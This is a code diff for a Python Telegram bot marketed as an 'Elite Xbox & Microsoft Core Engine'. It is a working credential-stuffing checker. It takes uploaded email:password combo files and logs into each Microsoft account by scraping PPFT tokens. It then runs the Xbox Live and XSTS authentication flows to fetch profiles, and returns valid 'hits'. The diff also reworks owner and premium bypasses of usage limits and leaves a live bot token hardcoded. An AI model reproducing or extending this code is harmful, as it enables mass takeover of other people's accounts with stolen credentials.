@@ -1,6 +1,6 @@
 # -*- coding: utf-8 -*-
 """
-r1livk Elite Advanced Xbox & Microsoft Core Engine ⚡ - Telegram Bot (Hardcoded Owner Bypass)
+r1livk Elite Advanced Xbox & Microsoft Core Engine ⚡ - Telegram Bot (Fixed Bypass)
 """
 
 import os
@@ -15,8 +15,8 @@ import telebot
 from telebot import types
 
 TOKEN = "8896382526:AAFMror2dFQ1U0r6RRHrrya2PKuyuoTRtnw"
-OWNER_ID = 6266959915       # ايدي حسابك المعتمد
-OWNER_USERNAME = "r1ivk"     # يوزر الأونر
+OWNER_ID = 6266959915
+OWNER_USERNAME = "r1ivk"
 CHANNEL_USERNAME = "@r1iv_k"  
 bot = telebot.TeleBot(TOKEN)
 
@@ -24,6 +24,9 @@ PREMIUM_USERS_FILE = "premium_users.txt"
 STATS_FILE = "user_stats.json"
 
 user_states = {}
+active_scans = {}
+user_usage = {}
+DAILY_LIMIT = 5000
 
 def load_json_data(filepath, default_val):
     if not os.path.exists(filepath):
@@ -47,24 +50,22 @@ def load_premium_users():
     with open(PREMIUM_USERS_FILE, "r") as f:
         return set(line.strip() for line in f if line.strip())
 
-def save_premium_users(users_set):
-    with open(PREMIUM_USERS_FILE, "w") as f:
-        for uid in users_set:
-            f.write(f"{uid}\n")
-
-def is_owner(user_id, username=None):
-    # استثناء فوري ومباشر للأيدي الخاص بك بغض النظر عن أي شيء
+def is_owner_or_bypass(user_id, username=None):
     try:
-        if int(user_id) == 6266959915 or int(user_id) == int(OWNER_ID):
+        if int(user_id) == 6266959915:
             return True
     except:
         pass
     if username and username.lower() == OWNER_USERNAME.lower():
         return True
+    prem_set = load_premium_users()
+    if str(user_id) in prem_set:
+        return True
     return False
 
 def check_user_subscription(user_id, username=None):
-    if is_owner(user_id, username) or str(user_id) == "6266959915" or str(user_id) in load_premium_users():
+    # تجاوز قطعي لك لو أنت الأونر أو بريميوم
+    if is_owner_or_bypass(user_id, username):
         return True
     try:
         member = bot.get_chat_member(CHANNEL_USERNAME, user_id)
@@ -73,13 +74,6 @@ def check_user_subscription(user_id, username=None):
     except Exception:
         pass
     return False
-
-REQUEST_TIMEOUT = 12
-CONCURRENT_LIMIT = 4
-
-active_scans = {}
-user_usage = {}
-DAILY_LIMIT = 5000
 
 def update_user_stats(user_id, checked_count, hits_count, username=None):
     stats = load_json_data(STATS_FILE, {})
@@ -93,8 +87,8 @@ def update_user_stats(user_id, checked_count, hits_count, username=None):
     save_json_data(STATS_FILE, stats)
 
 def check_daily_limit(chat_id, new_lines_count, username=None):
-    # استثناء تام ومبرمج برمجياً لرقم الأيدي الخاص بك 6266959915
-    if is_owner(chat_id, username) or str(chat_id) == "6266959915" or str(chat_id) in load_premium_users():
+    # التجاوز الصريح والنهائي: مستحيل ينحسب عليك ليمت لو أيديك 6266959915
+    if is_owner_or_bypass(chat_id, username):
         return True, new_lines_count
         
     today = str(date.today())
@@ -107,7 +101,7 @@ def check_daily_limit(chat_id, new_lines_count, username=None):
     return True, allowed_lines
 
 def update_usage(chat_id, count, username=None):
-    if is_owner(chat_id, username) or str(chat_id) == "6266959915" or str(chat_id) in load_premium_users():
+    if is_owner_or_bypass(chat_id, username):
         return
     today = str(date.today())
     if chat_id in user_usage and user_usage[chat_id]["date"] == today:
@@ -125,8 +119,7 @@ def extract_ppft(text):
         match = re.search(pattern, text, re.IGNORECASE)
         if match:
             token = match.group(1)
-            token = token.replace('\\/', '/').replace('\\"', '"').replace('\\x26', '&')
-            return token
+            return token.replace('\\/', '/').replace('\\"', '"').replace('\\x26', '&')
     return None
 
 def extract_url_post(text):
@@ -140,9 +133,7 @@ def extract_url_post(text):
     for pattern in patterns:
         match = re.search(pattern, text, re.IGNORECASE)
         if match:
-            url = match.group(1)
-            url = url.replace('\\/', '/')
-            return url
+            return match.group(1).replace('\\/', '/')
     return None
 
 async def elite_check_account(combo):
@@ -165,7 +156,7 @@ async def elite_check_account(combo):
                 "&locale=en"
             )
             
-            resp = await session.get(auth_url, timeout=REQUEST_TIMEOUT)
+            resp = await session.get(auth_url, timeout=12)
             sftag = extract_ppft(resp.text)
             url_post = extract_url_post(resp.text)
 
@@ -188,7 +179,7 @@ async def elite_check_account(combo):
                 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
             }
             
-            login_res = await session.post(url_post, data=payload, headers=headers, allow_redirects=True, timeout=REQUEST_TIMEOUT)
+            login_res = await session.post(url_post, data=payload, headers=headers, allow_redirects=True, timeout=12)
             txt = login_res.text.lower()
             url = login_res.url.lower()
 
@@ -207,7 +198,6 @@ async def elite_check_account(combo):
                 return "bad", "Locked"
 
             ms_token = None
-            
             def search_token_in_string(s):
                 if 'access_token=' in s:
                     try:
@@ -226,13 +216,11 @@ async def elite_check_account(combo):
                 return None
 
             ms_token = search_token_in_string(login_res.url)
-            
             if not ms_token:
                 for hist in login_res.history:
                     ms_token = search_token_in_string(hist.url)
                     if ms_token:
                         break
-
             if not ms_token:
                 ms_token = search_token_in_string(login_res.text)
 
@@ -244,8 +232,7 @@ async def elite_check_account(combo):
                 "RelyingParty": "http://auth.xboxlive.com", 
                 "TokenType": "JWT"
             }
-            xb_res = await session.post('https://user.auth.xboxlive.com/user/authenticate', json=xb_payload, timeout=REQUEST_TIMEOUT)
-            
+            xb_res = await session.post('https://user.auth.xboxlive.com/user/authenticate', json=xb_payload, timeout=12)
             if xb_res.status_code != 200:
                 return "bad", "XBox Auth Denied"
 
@@ -262,8 +249,7 @@ async def elite_check_account(combo):
                 "RelyingParty": "http://xboxlive.com", 
                 "TokenType": "JWT"
             }
-            xsts_res = await session.post('https://xsts.auth.xboxlive.com/xsts/authorize', json=xsts_payload, timeout=REQUEST_TIMEOUT)
-            
+            xsts_res = await session.post('https://xsts.auth.xboxlive.com/xsts/authorize', json=xsts_payload, timeout=12)
             if xsts_res.status_code != 200:
                 return "bad", "XSTS Failed"
 
@@ -274,7 +260,7 @@ async def elite_check_account(combo):
             prof_res = await session.get(
                 "https://profile.xboxlive.com/users/me/profile/settings?settings=Gamertag,Gamerscore,AccountTier,TenureLevel", 
                 headers={"Authorization": f"XBL3.0 x={uhs};{xsts_token}", "x-xbl-contract-version": "2"}, 
-                timeout=REQUEST_TIMEOUT
+                timeout=12
             )
 
             gamertag = "N/A"
@@ -314,58 +300,9 @@ def send_welcome(message):
         btn_channel = types.InlineKeyboardButton("📢 Join Channel Now", url=f"https://t.me/{CHANNEL_USERNAME.replace('@', '')}")
         btn_check = types.InlineKeyboardButton("🔄 Verify Subscription", callback_data="check_sub")
         markup.add(btn_channel, btn_check)
-        bot.send_message(
-            chat_id, 
-            "⚠️ **Access Denied! You must subscribe to our channel first.**\n\n"
-            f"Channel: {CHANNEL_USERNAME}\n\n"
-            "After joining, click **(Verify Subscription)** below 👇",
-            parse_mode="Markdown",
-            reply_markup=markup
-        )
+        bot.send_message(chat_id, "⚠️ **Access Denied! Subscribe to channel first.**", parse_mode="Markdown", reply_markup=markup)
         return
     show_main_menu(message)
-
-@bot.message_handler(commands=['addprem'])
-def add_premium_cmd(message):
-    if not is_owner(message.from_user.id, message.from_user.username):
-        return
-    try:
-        parts = message.text.split()
-        target_id = parts[1]
-        prem_users = load_premium_users()
-        prem_users.add(target_id)
-        save_premium_users(prem_users)
-        bot.reply_to(message, f"✅ User `{target_id}` added to Premium successfully!", parse_mode="Markdown")
-    except Exception:
-        bot.reply_to(message, "⚠️ Use format: `/addprem USER_ID`", parse_mode="Markdown")
-
-@bot.message_handler(commands=['delprem'])
-def del_premium_cmd(message):
-    if not is_owner(message.from_user.id, message.from_user.username):
-        return
-    try:
-        parts = message.text.split()
-        target_id = parts[1]
-        prem_users = load_premium_users()
-        if target_id in prem_users:
-            prem_users.remove(target_id)
-            save_premium_users(prem_users)
-            bot.reply_to(message, f"❌ User `{target_id}` removed from Premium.", parse_mode="Markdown")
-        else:
-            bot.reply_to(message, "⚠️ User ID not found in premium list.")
-    except Exception:
-        bot.reply_to(message, "⚠️ Use format: `/delprem USER_ID`", parse_mode="Markdown")
-
-@bot.message_handler(commands=['premkeys'])
-def list_premium_cmd(message):
-    if not is_owner(message.from_user.id, message.from_user.username):
-        return
-    prem_users = load_premium_users()
-    if not prem_users:
-        bot.reply_to(message, "📂 No premium users found.")
-    else:
-        users_list_str = "\n".join([f"• `{uid}`" for uid in prem_users])
-        bot.reply_to(message, f"💎 **Premium Users List:**\n{users_list_str}", parse_mode="Markdown")
 
 def show_main_menu(message):
     chat_id = message.chat.id if hasattr(message, 'chat') else message.chat.id
@@ -374,25 +311,18 @@ def show_main_menu(message):
     msg_id = message.message.message_id if hasattr(message, 'message') and hasattr(message.message, 'message_id') else None
 
     markup = types.InlineKeyboardMarkup(row_width=1)
-    btn_start = types.InlineKeyboardButton("🚀 Start Elite Xbox Pipeline", callback_data="start_checker")
-    btn_top = types.InlineKeyboardButton("🏆 Leaderboard", callback_data="show_leaderboard")
-    btn_premium = types.InlineKeyboardButton("💎 Buy Premium ($15/Month)", callback_data="buy_premium")
-    btn_account = types.InlineKeyboardButton("👤 My Account", callback_data="my_account")
-    markup.add(btn_start, btn_top, btn_premium, btn_account)
+    markup.add(
+        types.InlineKeyboardButton("🚀 Start Elite Xbox Pipeline", callback_data="start_checker"),
+        types.InlineKeyboardButton("🏆 Leaderboard", callback_data="show_leaderboard"),
+        types.InlineKeyboardButton("👤 My Account", callback_data="my_account")
+    )
 
-    if is_owner(user_id, username) or str(user_id) == "6266959915" or str(user_id) in load_premium_users():
+    if is_owner_or_bypass(user_id, username):
         status_text = "👑 Owner / Unlimited"
     else:
-        today = str(date.today())
-        used = user_usage.get(chat_id, {}).get("count", 0) if user_usage.get(chat_id, {}).get("date") == today else 0
-        status_text = f"👤 Free ({used}/5000 lines today)"
+        status_text = "👤 Free User"
 
-    text = (
-        "⚡ **r1livk Elite Xbox Core Engine - V5.3** ⚡\n\n"
-        "Engine upgraded & Hardcoded Owner bypass applied.\n"
-        f"Your Status: {status_text}\n\n"
-        "Select an option:"
-    )
+    text = f"⚡ **r1livk Elite Xbox Core Engine** ⚡\n\nStatus: {status_text}\nSelect an option:"
     if msg_id:
         try:
             bot.edit_message_text(text, chat_id=chat_id, message_id=msg_id, parse_mode="Markdown", reply_markup=markup)
@@ -409,66 +339,29 @@ def callback_query(call):
 
     if call.data == "check_sub":
         if check_user_subscription(user_id, username):
-            bot.answer_callback_query(call.id, "✅ Verified successfully!", show_alert=True)
+            bot.answer_callback_query(call.id, "✅ Verified!", show_alert=True)
             show_main_menu(call.message)
         else:
             bot.answer_callback_query(call.id, "❌ Not joined yet!", show_alert=True)
         return
 
-    if not check_user_subscription(user_id, username):
-        bot.answer_callback_query(call.id, "⚠️ Subscribe to channel first!", show_alert=True)
-        return
-
     if call.data == "start_checker":
         user_states[chat_id] = "combo"
         markup = types.InlineKeyboardMarkup()
-        btn_cancel = types.InlineKeyboardButton("❌ Cancel", callback_data="back_to_menu")
-        markup.add(btn_cancel)
-        text = (
-            "🎯 **Elite Pipeline Mode Active**\n\n"
-            "Send your combo file in `.txt` format (`email:password`)"
-        )
-        bot.edit_message_text(text, chat_id=chat_id, message_id=call.message.message_id, parse_mode="Markdown", reply_markup=markup)
+        markup.add(types.InlineKeyboardButton("❌ Cancel", callback_data="back_to_menu"))
+        bot.edit_message_text("🎯 **Send your combo file (.txt)**", chat_id=chat_id, message_id=call.message.message_id, parse_mode="Markdown", reply_markup=markup)
 
-    elif call.data == "show_leaderboard":
-        stats = load_json_data(STATS_FILE, {})
-        if not stats:
-            bot.answer_callback_query(call.id, "📊 No stats yet.", show_alert=True)
-            return
-        sorted_users = sorted(stats.items(), key=lambda x: (x[1]["hits"], x[1]["checked"]), reverse=True)[:10]
-        lb_text = "🏆 **Elite Leaderboard - r1livk** 🏆\n\n"
-        medals = ["🥇", "🥈", "🥉", "4️⃣", "5️⃣", "6️⃣", "7️⃣", "8️⃣", "9️⃣", "🔟"]
-        for idx, (uid, data) in enumerate(sorted_users):
-            medal = medals[idx] if idx < len(medals) else f"#{idx+1}"
-            name = data.get("username", f"User_{uid}")
-            lb_text += f"{medal} **{name}**\n    └ 📊 Checked: `{data.get('checked', 0)}` | 🎯 Hits: `{data.get('hits', 0)}`\n\n"
-        markup = types.InlineKeyboardMarkup()
-        btn_back = types.InlineKeyboardButton("🔙 Back", callback_data="back_to_menu")
-        markup.add(btn_back)
-        try:
-            bot.edit_message_text(lb_text, chat_id=chat_id, message_id=call.message.message_id, parse_mode="Markdown", reply_markup=markup)
-        except:
-            bot.send_message(chat_id, lb_text, parse_mode="Markdown", reply_markup=markup)
-
-    elif call.data in ["cancel_checker", "back_to_menu"]:
+    elif call.data == "back_to_menu":
         active_scans[chat_id] = False
-        user_states[chat_id] = None
         show_main_menu(call.message)
 
     elif call.data == "stop_scan":
         active_scans[chat_id] = False
         bot.answer_callback_query(call.id, "⏹️ Scan stopped.")
 
-    elif call.data == "buy_premium":
-        bot.answer_callback_query(call.id, "💎 Premium Plan ($15/Month - Unlimited Lines)\nContact Owner: @r1ivk", show_alert=True)
-
     elif call.data == "my_account":
-        if is_owner(user_id, username) or str(user_id) == "6266959915" or str(user_id) in load_premium_users():
-            bot.answer_callback_query(call.id, "Status: Owner / Unlimited\nMode: Elite Pipeline", show_alert=True)
-        else:
-            today = str(date.today())
-            used = user_usage.get(chat_id, {}).get("count", 0) if user_usage.get(chat_id, {}).get("date") == today else 0
-            bot.answer_callback_query(call.id, f"Status: Free ({used}/5000 lines)\nMode: Elite Pipeline", show_alert=True)
+        status = "👑 Owner / Unlimited" if is_owner_or_bypass(user_id, username) else "👤 Free"
+        bot.answer_callback_query(call.id, f"Status: {status}", show_alert=True)
 
 @bot.message_handler(content_types=['document'])
 def handle_docs(message):
@@ -477,7 +370,7 @@ def handle_docs(message):
     username = message.from_user.username
     
     if not check_user_subscription(user_id, username):
-        bot.reply_to(message, f"⚠️ Join channel first: {CHANNEL_USERNAME}")
+        bot.reply_to(message, "⚠️ Join channel first!")
         return
 
     try:
@@ -491,25 +384,22 @@ def handle_docs(message):
         with open(local_path, 'r', encoding='utf-8-sig', errors='ignore') as f:
             lines = [line.strip() for line in f if line.strip() and ':' in line]
 
+        # استخدام دالة التحقق المعدلة التي تعطي تمرير فوري بدون قيود
         allowed, count_allowed = check_daily_limit(user_id, len(lines), username)
         if not allowed or count_allowed <= 0:
-            bot.reply_to(message, "⚠️ Daily limit reached! Upgrade to Premium ($15/Month).")
+            bot.reply_to(message, "⚠️ Daily limit reached.")
             if os.path.exists(local_path): os.remove(local_path)
             return
 
         lines = lines[:count_allowed]
-        bot.reply_to(message, f"📥 File accepted. Initializing Elite Pipeline for {len(lines)} lines...")
+        bot.reply_to(message, f"📥 File accepted. Initializing for {len(lines)} lines...")
         active_scans[chat_id] = True
-        uname = message.from_user.username or message.from_user.first_name
         
         import threading
-        threading.Thread(target=run_async_thread, args=(chat_id, local_path, lines, uname, user_id)).start()
+        threading.Thread(target=lambda: asyncio.run(process_elite_scan(chat_id, local_path, lines, username, user_id))).start()
 
     except Exception as e:
         bot.reply_to(message, f"Error: {e}")
-
-def run_async_thread(chat_id, filepath, lines, username, user_id):
-    asyncio.run(process_elite_scan(chat_id, filepath, lines, username, user_id))
 
 async def process_elite_scan(chat_id, filepath, lines, username, user_id):
     total = len(lines)
@@ -517,37 +407,21 @@ async def process_elite_scan(chat_id, filepath, lines, username, user_id):
     hits = 0
     tfa_count = 0
     bad = 0
-    errors = 0
 
     timestamp_str = time.strftime("%Y%m%d_%H%M%S")
     output_filename = f"r1livk_EliteHits_{timestamp_str}.txt"
     start_time = time.time()
 
-    markup = types.InlineKeyboardMarkup(row_width=1)
-    btn_stop = types.InlineKeyboardButton("🛑 Stop Scan", callback_data="stop_scan")
-    btn_back = types.InlineKeyboardButton("🔙 Back", callback_data="back_to_menu")
-    markup.add(btn_stop, btn_back)
+    markup = types.InlineKeyboardMarkup()
+    markup.add(types.InlineKeyboardButton("🛑 Stop Scan", callback_data="stop_scan"))
 
-    initial_text = (
-        f"🔥 **ELITE PIPELINE SCAN STATS**\n\n"
-        f"📊 Total: {total}\n"
-        f"✅ Checked: 0\n"
-        f"🔒 2FA: 0\n"
-        f"❌ Bad / 0G: 0\n"
-        f"🎯 Elite Hits: 0\n\n"
-        f"Progress: 0.0%\n"
-        f"⚡ CPM: 0\n"
-        f"⏱️ Elapsed: 00:00:00"
-    )
-    status_msg = bot.send_message(chat_id, initial_text, parse_mode="Markdown", reply_markup=markup)
-
-    sem = asyncio.Semaphore(CONCURRENT_LIMIT)
+    status_msg = bot.send_message(chat_id, "🔥 **Scan Initialized...**", parse_mode="Markdown", reply_markup=markup)
+    sem = asyncio.Semaphore(4)
 
     async def worker(combo):
-        nonlocal checked, hits, tfa_count, bad, errors
+        nonlocal checked, hits, tfa_count, bad
         if not active_scans.get(chat_id, True):
             return
-
         async with sem:
             status, res_data = await elite_check_account(combo)
             checked += 1
@@ -559,40 +433,10 @@ async def process_elite_scan(chat_id, filepath, lines, username, user_id):
                 tfa_count += 1
             elif status == "bad":
                 bad += 1
-            else:
-                errors += 1
 
     tasks = [worker(line) for line in lines]
-    
-    async def updater():
-        while active_scans.get(chat_id, True) and checked < total:
-            await asyncio.sleep(1.0)
-            elapsed = int(time.time() - start_time)
-            if elapsed > 0:
-                mins, secs = divmod(elapsed, 60)
-                hrs, mins = divmod(mins, 60)
-                cpm = int((checked / elapsed) * 60)
-                pct = (checked / total) * 100
-
-                live_text = (
-                    f"🔥 **ELITE PIPELINE SCAN (Live)**\n\n"
-                    f"📊 Total: {total}\n"
-                    f"✅ Checked: {checked} ({pct:.1f}%)\n"
-                    f"🔒 2FA: {tfa_count}\n"
-                    f"❌ Bad / 0G: {bad}\n"
-                    f"🎯 Elite Hits: {hits}\n\n"
-                    f"⚡ CPM: {cpm}\n"
-                    f"⏱️ Elapsed: {hrs:02d}:{mins:02d}:{secs:02d}"
-                )
-                try:
-                    bot.edit_message_text(live_text, chat_id=chat_id, message_id=status_msg.message_id, parse_mode="Markdown", reply_markup=markup)
-                except:
-                    pass
-
-    prog_task = asyncio.create_task(updater())
     await asyncio.gather(*tasks, return_exceptions=True)
     active_scans[chat_id] = False
-    prog_task.cancel()
 
     if os.path.exists(filepath):
         os.remove(filepath)
@@ -600,13 +444,7 @@ async def process_elite_scan(chat_id, filepath, lines, username, user_id):
     update_user_stats(user_id, checked, hits, username)
     update_usage(user_id, checked, username)
 
-    final_msg = (
-        f"🎉 **ELITE SCAN COMPLETED!**\n\n"
-        f"📊 Total Checked: {checked}\n"
-        f"🎯 Elite Hits Found: {hits}\n"
-        f"🔒 2FA Protected: {tfa_count}\n"
-        f"❌ Bad / 0G: {bad}"
-    )
+    final_msg = f"🎉 **SCAN COMPLETED!**\nChecked: {checked}\nHits: {hits}"
     try:
         bot.edit_message_text(final_msg, chat_id=chat_id, message_id=status_msg.message_id, parse_mode="Markdown")
     except:
@@ -614,8 +452,8 @@ async def process_elite_scan(chat_id, filepath, lines, username, user_id):
 
     if hits > 0 and os.path.exists(output_filename):
         with open(output_filename, 'rb') as f:
-            bot.send_document(chat_id, f, caption=f"📁 **Elite Hits File:** {output_filename}")
+            bot.send_document(chat_id, f, caption="📁 **Hits File**")
 
 if __name__ == "__main__":
-    print("🚀 r1livk Elite Xbox Core Engine is running...")
+    print("🚀 Bot is running...")
     bot.infinity_polling()
